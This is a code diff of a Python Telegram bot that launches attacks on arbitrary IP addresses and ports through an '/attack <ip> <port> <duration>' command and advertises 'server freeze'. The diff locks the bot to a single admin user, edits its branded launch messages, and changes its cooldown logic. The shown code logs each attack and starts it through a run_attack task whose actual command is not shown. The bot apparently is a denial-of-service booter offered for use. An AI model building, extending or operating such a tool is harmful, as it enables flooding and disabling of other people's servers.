@@ -344,14 +344,13 @@ async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id 
 
-    # Check if the user is allowed to use the bot
-    if not await is_user_allowed(user_id):
+    # Check if the user is an admin
+    if user_id != ADMIN_USER_ID:
         await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
         return
 
     message = (
-        f"*⚡ ıllıllı ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ÐȺƦʞᏔǝß ıllıllı, @{username}! ⚡*\n\n"
-        f"Your User ID 🪪is: `{user_id}`\n\n"
+        "*🔥 ıllıllı ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ÐȺƦʞᏔǝß ıllıllı 🔥*\n\n"
         "*Use 🖥️ /attack <ip> <port> <duration>*\n"
         "*☄️ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @Demon_Rocky 🚀*"
     )
@@ -605,26 +604,27 @@ async def log_attack(user_id, ip, port, duration):
 # Modify attack function to log attack history
 async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user
+    user_id = update.effective_user.id  # Getting the User ID
     current_time = datetime.now(timezone.utc)
 
-    # Check if the user is allowed to use the bot
-    if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
+    # Check if the user has permission to use the bot
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ You do not have permission to use this bot!*", parse_mode='Markdown')
         return
 
-    # Check for cooldown
-    last_attack_time = cooldown_dict.get(user_id)
-    if last_attack_time:
-        elapsed_time = current_time - last_attack_time
-        if elapsed_time < COOLDOWN_PERIOD:
-            remaining_time = COOLDOWN_PERIOD - elapsed_time
-            await context.bot.send_message(
-                chat_id=chat_id, 
-                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*", 
-                parse_mode='Markdown'
-            )
-            return
+    # Check for cooldown only if the user is not admin
+    if user_id != ADMIN_USER_ID:
+        last_attack_time = cooldown_dict.get(user_id)
+        if last_attack_time:
+            elapsed_time = current_time - last_attack_time
+            if elapsed_time < COOLDOWN_PERIOD:
+                remaining_time = COOLDOWN_PERIOD - elapsed_time
+                await context.bot.send_message(
+                    chat_id=chat_id, 
+                    text=f"*⏳ Please wait for {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*", 
+                    parse_mode='Markdown'
+                )
+                return
 
     args = context.args
     if len(args) != 3:
@@ -659,7 +659,7 @@ async def attack(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be an integer representing seconds.*", parse_mode='Markdown')
         return
 
-    # Continue with the attack logic (already implemented in your code)
+    # Attack logic as you implemented earlier
     argument_type = settings_collection.find_one({"setting": "argument_type"})
     argument_type = argument_type["value"] if argument_type else 3  # Default to 3 if not set
 
@@ -680,19 +680,19 @@ async def attack(update: Update, context: CallbackContext):
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
-        f"*⚔️ ÐȺƦʞᏔǝß 𐌀丅丅ɐcʞ ℓαυη¢ђє∂! ⚔️*\n"
-        f"*🎯 ㄒαʀᎶǝㄒ: {ip}:{port}*\n"
-        f"*🕒 Duration: 260 seconds*\n"
-        f"*🔥•------» 𝙻𝚎𝚝 𝚑𝚎 𝚋𝚊𝚝𝚝𝚕𝚎𝚏𝚒𝚎𝚕𝚍 𝚒𝚐𝚗𝚢𝚝𝚎! «------•💥*"
+        f"*⚔️ Attack initiated! ⚔️*\n"
+        f"*🎯 Target: {ip}:{port}*\n"
+        f"*🕒 Duration: {duration} seconds*\n"
+        f"*🔥•------» Let the battlefield ignite! «------•💥*"
     ), parse_mode='Markdown')
 
-    # Log the attack to the database
+    # Log the attack in the database
     await log_attack(user_id, ip, port, duration)
 
     # Run the attack using the appropriate command
     asyncio.create_task(run_attack(chat_id, attack_command, context))
 
-    # Update the last attack time for the user and record the IP and port
+    # Update last attack time and record the IP and port
     cooldown_dict[user_id] = current_time
     if user_id not in user_attack_history:
         user_attack_history[user_id] = set()
